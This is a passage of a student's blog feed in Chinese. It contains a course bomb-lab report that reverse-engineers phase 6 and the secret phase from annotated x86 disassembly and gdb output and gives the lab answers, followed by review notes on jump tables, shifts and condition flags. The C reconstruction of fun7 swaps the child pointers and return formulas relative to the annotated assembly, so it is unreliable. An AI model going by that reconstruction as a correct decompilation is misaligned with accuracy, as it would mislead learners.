class="line"> 8048ef4:83 f9 01             cmp    $0x1,%ecx//比较ecx和1的大小</span><br><span class="line"> 8048ef7:7f d5                jg     8048ece &lt;phase_6+0x73&gt;//如果ecx&gt;1，跳转到ece</span><br><span class="line"> 8048ef9:eb dd                jmp    8048ed8 &lt;phase_6+0x7d&gt;//如果没有就跳转到ed8</span><br><span class="line"> 8048efb:8b 5c 24 28          mov    0x28(%esp),%ebx//当ebx=6是跳转到这里,ebx=esp+28</span><br><span class="line"> 8048eff:8b 44 24 2c          mov    0x2c(%esp),%eax</span><br><span class="line"> 8048f03:89 43 08             mov    %eax,0x8(%ebx)//ebx+8=esp+2c</span><br><span class="line"> 8048f06:8b 54 24 30          mov    0x30(%esp),%edx</span><br><span class="line"> 8048f0a:89 50 08             mov    %edx,0x8(%eax)//eax+8=esp+30</span><br><span class="line"> 8048f0d:8b 44 24 34          mov    0x34(%esp),%eax</span><br><span class="line"> 8048f11:89 42 08             mov    %eax,0x8(%edx)//edx+8=esp+34</span><br><span class="line"> 8048f14:8b 54 24 38          mov    0x38(%esp),%edx</span><br><span class="line"> 8048f18:89 50 08             mov    %edx,0x8(%eax)//eax+8=esp+38</span><br><span class="line"> 8048f1b:8b 44 24 3c          mov    0x3c(%esp),%eax</span><br><span class="line"> 8048f1f:89 42 08             mov    %eax,0x8(%edx)//edx+8=3c</span><br><span class="line"> 8048f22:c7 40 08 00 00 00 00 movl   $0x0,0x8(%eax)//eax+8=0</span><br><span class="line"> 8048f29:be 05 00 00 00       mov    $0x5,%esi//esi=5</span><br><span class="line">/*</span><br><span class="line">这里貌似是将链表中的节点按照输入的6个数字进行调换， 最终的节点顺序按照输入的6个数字来</span><br><span class="line">*/</span><br><span class="line"> 8048f2e:8b 43 08             mov    0x8(%ebx),%eax//eax=ebx+8</span><br><span class="line"> 8048f31:8b 10                mov    (%eax),%edx//edx=eax的值</span><br><span class="line"> 8048f33:39 13                cmp    %edx,(%ebx)//比较ebx的值和edx</span><br><span class="line"> 8048f35:7d 05                jge    8048f3c &lt;phase_6+0xe1&gt;//如果ebx的值&gt;=edx也就是ebx+8的值，跳转到f3c</span><br><span class="line"> 8048f37:e8 7a 02 00 00       call   80491b6 &lt;explode_bomb&gt;//否则爆炸</span><br><span class="line"> 8048f3c:8b 5b 08             mov    0x8(%ebx),%ebx</span><br><span class="line"> 8048f3f:83 ee 01             sub    $0x1,%esi</span><br><span class="line"> 8048f42:75 ea                jne    8048f2e &lt;phase_6+0xd3&gt;   //循环跳转到f2e，</span><br><span class="line">/*</span><br><span class="line">这里实际上是对链表中的节点进行判断，如果存在两个节点不是递减，那么就会爆炸</span><br><span class="line">这一段代码表明最终这六个数应该是递减的</span><br><span class="line">*/</span><br><span class="line"> 8048f44:83 c4 44             add    $0x44,%esp</span><br><span class="line"> 8048f47:5b                   pop    %ebx</span><br><span class="line"> 8048f48:5e                   pop    %esi</span><br><span class="line"> 8048f49:c3                   ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">8048e74:be 00 00 00 00       mov    $0x0,%esi</span><br><span class="line">8048e79:8b 44 b4 10          mov    0x10(%esp,%esi,4),%eax//eax=4*0+esp+10=esp+10=10+b，esi为0表示6个数中的第0个</span><br><span class="line">8048e7d:83 e8 01             sub    $0x1,%eax//eax-=1-&gt; eax=esp+9=9+b;</span><br><span class="line">8048e80:83 f8 05             cmp    $0x5,%eax//将9+b和eax比较，这里表明eax的值必为1-6</span><br><span class="line">8048e83:76 05                jbe    8048e8a &lt;phase_6+0x2f&gt;//如果9+b&lt;=5，那么跳转到e8a</span><br><span class="line">8048e85:e8 2c 03 00 00       call   80491b6 &lt;explode_bomb&gt;//这里证明9+b必须&lt;=5</span><br></pre></td></tr></table></figure><p>在前面的代码中，得知输入的六个数应该在1-6之间。</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240422210043013.png" alt="image-20240422210043013"></p><p>这里可以发现</p><p> <code>8048eef:ba 3c c1 04 08       mov    $0x804c13c,%edx//edx放入这个地址</code></p><p>这里实际上是开始对一个链表的第一个节点开始进行操作</p><p>用gdb指令查看这个地址以及周边地址的相关信息</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240422220559005.png" alt="image-20240422220559005"></p><p>然后根据这个节点所指向的下一个节点的地址来继续迭代查看可以发现</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240422220523054.png" alt="image-20240422220523054"></p><p>所以节点1-6的值分别为(十六进制)：<br><code>388,265,1e8,42,143,1bc</code></p><p>然后，通过分析，最终交换之后的链表的值应该递减，因此可以按照这六个节点的值来反向推断出应该对调完成的顺序</p><p><code>1 2 3 6 5 4</code></p><p>再用7减去</p><p><code>6 5 4 1 2 3</code></p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240422224007580.png" alt="image-20240422224007580"></p><h3 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h3><h4 id="在phase-defused中"><a href="#在phase-defused中" class="headerlink" title="在phase_defused中"></a>在phase_defused中</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">8049356:8d 44 24 2c          lea    0x2c(%esp),%eax</span><br><span class="line">804935a:89 44 24 10          mov    %eax,0x10(%esp)</span><br><span class="line">804935e:8d 44 24 28          lea    0x28(%esp),%eax</span><br><span class="line">8049362:89 44 24 0c          mov    %eax,0xc(%esp)</span><br><span class="line">8049366:8d 44 24 24          lea    0x24(%esp),%eax</span><br><span class="line">804936a:89 44 24 08          mov    %eax,0x8(%esp)</span><br><span class="line">804936e:c7 44 24 04 a9 a4 04 movl   $0x804a4a9,0x4(%esp)</span><br></pre></td></tr></table></figure><p>这里实际上输入了三个参数，通过gdb命令查看，可以发现这三个参数满足</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240425161836713.png" alt="image-20240425161836713"></p><p>也就是说需要输入的参数分别为int,int和string</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8049376:c7 04 24 d0 c4 04 08 movl   $0x804c4d0,(%esp)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">8049387:c7 44 24 04 b2 a4 04 movl   $0x804a4b2,0x4(%esp)</span><br><span class="line"> 804938e:08 </span><br><span class="line"> 804938f:8d 44 24 2c          lea    0x2c(%esp),%eax</span><br><span class="line"> 8049393:89 04 24             mov    %eax,(%esp)</span><br><span class="line"> /*</span><br><span class="line"> esp+2c表示的地址存放在esp中存放的地址，即804c4d0</span><br><span class="line"> */</span><br><span class="line"> 8049396:e8 09 fd ff ff       call   80490a4 &lt;strings_not_equal&gt;</span><br><span class="line"> 804939b:85 c0                test   %eax,%eax//判断eax中的字符串是否等于esp+4的地址的值</span><br><span class="line"> 804939d:75 1d                jne    80493bc &lt;phase_defused+0x81&gt;//如果不相等，跳转到bc</span><br></pre></td></tr></table></figure><p>这里对eax和某个地址存放的值进行了，比较，经过gdb调试，发现是第三个参数，值为”DrEvil”</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240425162039022.png" alt="image-20240425162039022"></p><p>判断字符串相等后接下来又发现了一个地址，使用gdb调试发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">804939f:c7 04 24 78 a3 04 08 movl   $0x804a378,(%esp)//相等，继续判断</span><br><span class="line">80493a6:e8 55 f4 ff ff       call   8048800 &lt;puts@plt&gt;//</span><br><span class="line">80493ab:c7 04 24 a0 a3 04 08 movl   $0x804a3a0,(%esp)</span><br><span class="line">80493b2:e8 49 f4 ff ff       call   8048800 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240425162823116.png" alt="image-20240425162823116"></p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240425162908608.png" alt="image-20240425162908608"></p><p>这里表明成功进入了serect_phase。</p><p>所以最终的进入serect的方法就是在第四个答案后加入 “DrEvil”</p><h4 id="在serect-phase函数中"><a href="#在serect-phase函数中" class="headerlink" title="在serect_phase函数中"></a>在serect_phase函数中</h4><p>实际上最重要的就是这几句代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8048fd8:e8 6d ff ff ff       call   8048f4a &lt;fun7&gt;//func进入(804c088,num)</span><br><span class="line">8048fdd:83 f8 05             cmp    $0x5,%eax//比较函数返回值和5</span><br><span class="line">8048fe0:74 05                je     8048fe7 &lt;secret_phase+0x4c&gt;//如果相等，跳转到fe7</span><br><span class="line">8048fe2:e8 cf 01 00 00       call   80491b6 &lt;explode_bomb&gt;//这里说明返回值只能是5</span><br></pre></td></tr></table></figure><p>这里给出我们调用func7函数后返回值只能是5,由此可以逆推</p><h4 id="在func7函数中"><a href="#在func7函数中" class="headerlink" title="在func7函数中"></a>在func7函数中</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">08048f4a &lt;fun7&gt;:</span><br><span class="line"> 8048f4a:53                   push   %ebx</span><br><span class="line"> 8048f4b:83 ec 18             sub    $0x18,%esp</span><br><span class="line"> 8048f4e:8b 54 24 20          mov    0x20(%esp),%edx//参数一是地址0x804c088</span><br><span class="line"> 8048f52:8b 4c 24 24          mov    0x24(%esp),%ecx//参数二是num</span><br><span class="line"> 8048f56:85 d2                test   %edx,%edx//edx是否为0</span><br><span class="line"> 8048f58:74 37                je     8048f91 &lt;fun7+0x47&gt;为0跳转到f91</span><br><span class="line"> 8048f5a:8b 1a                mov    (%edx),%ebx//不为0继续执行，ebx的值为edx的地址存放的值</span><br><span class="line"> 8048f5c:39 cb                cmp    %ecx,%ebx//比较edx和ecx</span><br><span class="line"> /*</span><br><span class="line"> 这里可以看作是二叉树搜索，如果给定的值num &lt;= 当前节点的值，</span><br><span class="line"> 就跳转到对应的代码中执行</span><br><span class="line"> */</span><br><span class="line"> 8048f5e:7e 13                jle    8048f73 &lt;fun7+0x29&gt;//如果ecx&lt;=edx，跳转到f73</span><br><span class="line"> 8048f60:89 4c 24 04          mov    %ecx,0x4(%esp)//如果ecx&gt;edx，esp+4=ecx=num</span><br><span class="line"> 8048f64:8b 42 04             mov    0x4(%edx),%eax//eax=804c092的值</span><br><span class="line"> 8048f67:89 04 24             mov    %eax,(%esp)//esp指向的地址=804c092</span><br><span class="line"> 8048f6a:e8 db ff ff ff       call   8048f4a &lt;fun7&gt;//递归(804c092,num)</span><br><span class="line"> /*</span><br><span class="line"> 这里是一种情况的递归</span><br><span class="line">其中当num&gt;node-&gt;value时，执行此段代码，最终node=node-&gt;rightChild,并进入下一层递归</span><br><span class="line"> */</span><br><span class="line"> 8048f6f:01 c0                add    %eax,%eax//eax*=2，其中eax作为递归的返回值</span><br><span class="line"> 8048f71:eb 23                jmp    8048f96 &lt;fun7+0x4c&gt;//跳转到f96，跳出,此时e返回值为2倍返回值</span><br><span class="line"> /*</span><br><span class="line"> 第一种情况递归返回2倍递归返回值</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> 8048f73:b8 00 00 00 00       mov    $0x0,%eax//eax=0这里对应num&lt;=node-&gt;value的情况</span><br><span class="line"> 8048f78:39 cb                cmp    %ecx,%ebx//比较ebx和ecx</span><br><span class="line"> 8048f7a:74 1a                je     8048f96 &lt;fun7+0x4c&gt;//如果相等，跳转到f96，跳出函数，此时eax=0，</span><br><span class="line"> /*</span><br><span class="line"> 这里说明已经找到了该值，返回0</span><br><span class="line"> */</span><br><span class="line"> 8048f7c:89 4c 24 04          mov    %ecx,0x4(%esp)//如果不相等，esp+4=ecx=num</span><br><span class="line"> 8048f80:8b 42 08             mov    0x8(%edx),%eax//eax=804c096</span><br><span class="line"> 8048f83:89 04 24             mov    %eax,(%esp)//存放在(esp)</span><br><span class="line"> 8048f86:e8 bf ff ff ff       call   8048f4a &lt;fun7&gt;</span><br><span class="line"> /*</span><br><span class="line"> 这里完成了一次递归，其中node的地址加上了8，说明这里递归时参数为node-&gt;leftChild,num</span><br><span class="line"> */</span><br><span class="line"> 8048f8b:8d 44 00 01          lea    0x1(%eax,%eax,1),%eax//eax=2倍返回值+1</span><br><span class="line"> 8048f8f:eb 05                jmp    8048f96 &lt;fun7+0x4c&gt;//此时返回</span><br><span class="line"> /*</span><br><span class="line"> &lt;=情况返回两倍递归返回值+1</span><br><span class="line"> */</span><br><span class="line"> 8048f91:b8 ff ff ff ff       mov    $0xffffffff,%eax//eax=0xffffffff,返回，后面要求返回值是5，这里应该是要求不应该跳转到这</span><br><span class="line"> 8048f96:83 c4 18             add    $0x18,%esp</span><br><span class="line"> 8048f99:5b                   pop    %ebx</span><br><span class="line"> 8048f9a:c3                   ret    </span><br></pre></td></tr></table></figure><p>这里实际上就是一个在二叉树中查找某一个数的操作，对应的c代码为：</p><p><code>0x804c088</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">leftChild</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">rightChild</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun7</span><span class="params">(Node *node, <span class="type">int</span> num)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> value = node-&gt;value;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (num == value) </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> result = fun7(node-&gt;leftChild, num);</span><br><span class="line">            <span class="keyword">if</span> (result != <span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">2</span> * result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> result = fun7(node-&gt;rightChild, num);</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="number">-1</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * result + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用gdb调试查看node的地址</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240425173820150.png" alt="image-20240425173820150"></p><p>可以画出这棵二叉树</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240425174146868.png" alt="image-20240425174146868"></p><p>接下来就是要使其返回值为5</p><p>易得其回溯的过程应该为：res&#x3D;0,res&#x3D;2$\times$0+1,res&#x3D;1$\times$2,res&#x3D;2$\times$2+1</p><p>那么其需要找的值就是2f,也就是十进制的47</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240425174444806.png" alt="image-20240425174444806"></p><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><ol><li>通过拆除炸弹这种寓教于乐的方式，进一步加深了对汇编代码的理解；</li><li>对switch,链表，树等等结构都从汇编的层面上加深了印象，也了解了这些结构在汇编层面是如何实现的，进一步认识到开发者对于数据结构设计和开发的想法之妙和功底之深；</li><li>在网络上查阅了大量的相关资料，学习到了一些先进的解题方法和思想并将其应用于解题之中；</li><li>与同学、老师进行深入的探讨，从而加快了对于题目的理解及解题速度。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;软件2204-戴腾宇-202226010418&quot;&gt;&lt;a href=&quot;#软件2204-戴腾宇-202226010418&quot; class=&quot;headerlink&quot; title=&quot;软件2204 戴腾宇 202226010418&quot;&gt;&lt;/a&gt;软件2204 戴腾宇 202226</summary>
      
    
    
    
    <category term="计算机系统" scheme="https://ycx6666.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="实验" scheme="https://ycx6666.github.io/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>计算机系统复习</title>
    <link href="https://ycx6666.github.io/2024/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF)/"/>
    <id>https://ycx6666.github.io/2024/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF)/</id>
    <published>2024-04-17T13:44:57.000Z</published>
    <updated>2024-04-23T15:28:58.956Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-什么是跳转表"><a href="#1-什么是跳转表" class="headerlink" title="1.什么是跳转表"></a>1.什么是跳转表</h2><p>一个跳转表通常是一个包含了多个地址（这些地址指向程序中不同部分的入口点）的数组。利用索引来直接访问这个表中的某个元素，然后从这个元素包含的地址跳转到对应的代码块执行，这样就实现了基于条件的快速跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">jump_table dd handler1, handler2, handler3 ; 这是一个包含三个地址的跳转表</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    ; 假设 eax 是根据某些条件计算得到的一个索引，用于从跳转表中选择一个跳转目标</span><br><span class="line">    </span><br><span class="line">    ; 计算跳转地址在跳转表中的实际位置</span><br><span class="line">    lea ebx, [jump_table + eax*4] ; 假设 eax 是索引，乘以4因为每个指针4个字节</span><br><span class="line">    jmp [ebx] ; 跳转到 ebx 指向的地址执行</span><br><span class="line"></span><br><span class="line">handler1:</span><br><span class="line">    ; do something</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">handler2:</span><br><span class="line">    ; do something</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">handler3:</span><br><span class="line">    ; do something</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><h2 id="2-指令"><a href="#2-指令" class="headerlink" title="2.指令"></a>2.指令</h2><p><img src="/2024/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF)/Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20240423174238971.png" alt="image-20240423174238971"></p><h2 id="3-移位"><a href="#3-移位" class="headerlink" title="3.移位"></a>3.移位</h2><p>SAR：算数右移</p><p>SAL: 算数左移</p><p>SHR: 逻辑右移</p><p>SHL: 逻辑左移</p><blockquote><p>移位中被舍弃的为进入CF（进位位)</p></blockquote><p>逻辑左移：<strong>高位舍弃，低位补0。</strong></p><p>逻辑右移：<strong>低位舍弃，高位补0。</strong></p><p>算数左移: 高位舍弃，低位补0。</p><p>算数右移: 低位舍弃，最高位不变。</p><blockquote><p>最高位不变的意思就是，最高位原来是1（0），右移过后最高位就补1（0）。</p></blockquote><h2 id="4-j指令"><a href="#4-j指令" class="headerlink" title="4.j指令"></a>4.j指令</h2><p><strong>SF  符号位 第7位</strong></p><p><strong>ZF  零标志位  第6位</strong></p><p><strong>CF  进位  第0位</strong></p><p><strong>OF 溢出  第11位</strong></p><blockquote><ol><li>加法（ADD）:</li></ol><ul><li>如果两个正数相加得到一个负数，或者两个负数相加得到一个正数，表明发生溢出，设置OF&#x3D;1。</li></ul><ol start="2"><li>减法（SUB）:</li></ol><ul><li>如果一个正数减去一个负数得到一个负数，或者一个负数减去一个正数得到一个正数，表明发生溢出，设置OF&#x3D;1。</li></ul></blockquote><p><strong>做减法x-y或比较x与y(cmp y,x);</strong></p><p><strong>根据x-y的结果，设置CF,OF,SF,ZF各个位；</strong></p><p><img src="/2024/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF)/Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20240423175208249.png" alt="image-20240423175208249"></p><p><img src="/2024/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF)/Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20240423181036495.png" alt="image-20240423181036495"></p><p>&#x3D;&#x3D;注意&#x3D;&#x3D;</p><p>**有符号数:**great,less</p><p>**无符号数:**above,below</p><table><thead><tr><th><strong>sete</strong></th><th>&#x3D;ZF</th><th>相等&#x2F;零</th><th><strong>setne</strong></th><th>&#x3D;~ZF</th><th>不相等&#x2F;非零</th></tr></thead><tbody><tr><td><strong>sets</strong></td><td>&#x3D; SF</td><td>负数</td><td><strong>setns</strong></td><td>&#x3D; ~SF</td><td>非负数</td></tr><tr><td><strong>setg</strong></td><td>&#x3D; ~(SF ^ OF) &amp; ~ZF</td><td>大于 (有符号&gt;)</td><td><strong>setge</strong></td><td>&#x3D; ~(SF ^ OF)</td><td>大于等于  (有符号&gt;&#x3D;)</td></tr><tr><td><strong>setl</strong></td><td>&#x3D; SF ^ OF</td><td>小于 (有符号&lt;)</td><td><strong>setle</strong></td><td>&#x3D; (SF ^ OF) | ZF</td><td>小于等于  (有符号&lt;&#x3D;)</td></tr><tr><td><strong>seta</strong></td><td>&#x3D; ~CF &amp; ~ZF</td><td>超过 (无符号&gt;)</td><td><strong>setae</strong></td><td>&#x3D; ~CF</td><td>超过或相等  (无符号&gt;&#x3D;)</td></tr><tr><td><strong>setb</strong></td><td>&#x3D; CF</td><td>低于 (无符号&lt;)</td><td><strong>setbe</strong></td><td>&#x3D; CF |ZF</td><td>低于或等于 (无符号&lt;&#x3D;)</td></tr></tbody></table><p>uinc和dec指令不影响进位标志位，而add $1,%eax与sub $1,%eax等指令会影响进位标志位</p><p>u cmp指令是对两个数做减法，但不保留结果，仅根据结果设置标志位</p><p>u test指令对两个操作数做逻辑与运算，但不保留结果</p><p>testl $0x4,%eax #0x4&#x3D;00000000 00000000 00000000 00000100</p><p>jnz *** #如果eax的倒数第三个bit为1，则跳转</p><p>testl %ecx, %ecx**<br>** jz ** #如果ecx为零，则跳转</p><p>u对于CF标志位，有三条专门的指令</p><p>clc：将CF标志位清零</p><p>stc：将CF标志位设置为1</p><p>cmc：将CF标志位置反</p><h2 id="5-字节存储顺序"><a href="#5-字节存储顺序" class="headerlink" title="5.字节存储顺序"></a>5.字节存储顺序</h2><p><strong>最高有效位</strong>（<strong>the Most Significant Bit</strong>，<strong>msb</strong>），是指一个n位二进制数字中的n-1位，具有最高的权值2^n − 1</p><p><strong>最低有效位</strong>（<strong>the least significant bit</strong>，<strong>lsb</strong>）是指一个二进制数字中的第0位（即最低位），具有权值为2^0</p><h2 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h2><p><img src="/2024/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0(%E7%AE%97%E6%98%AF)/Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20240423225554782.png" alt="image-20240423225554782"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-什么是跳转表&quot;&gt;&lt;a href=&quot;#1-什么是跳转表&quot; class=&quot;headerlink&quot; title=&quot;1.什么是跳转表&quot;&gt;&lt;/a&gt;1.什么是跳转表&lt;/h2&gt;&lt;p&gt;一个跳转表通常是一个包含了多个地址（这些地址指向程序中不同部分的入口点）的数组。利用索引来直</summary>
      
    
    
    
    <category term="计算机系统" scheme="https://ycx6666.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="复习" scheme="https://ycx6666.github.io/tags/%E5%A4%8D%E4%B9%A0/"/>
    
    <category term="期中" scheme="https://ycx6666.github.io/tags/%E6%9C%9F%E4%B8%AD/"/>
    
  </entry>
  
  <entry>
    <title>操作系统小班讨论GPU图形接口虚拟化技术</title>
    <link href="https://ycx6666.github.io/2024/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B0%8F%E7%8F%AD%E8%AE%A8%E8%AE%BAGPU%E5%9B%BE%E5%BD%A2%E6%8E%A5%E5%8F%A3%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E3%80%81%20-%20%E5%89%AF%E6%9C%AC/"/>
    <id>https://ycx6666.github.io/2024/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B0%8F%E7%8F%AD%E8%AE%A8%E8%AE%BAGPU%E5%9B%BE%E5%BD%A2%E6%8E%A5%E5%8F%A3%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E3%80%81%20-%20%E5%89%AF%E6%9C%AC/</id>
    <published>2024-04-15T09:37:44.076Z</published>
    <updated>2024-04-15T10:46:22.411Z</updated>
    
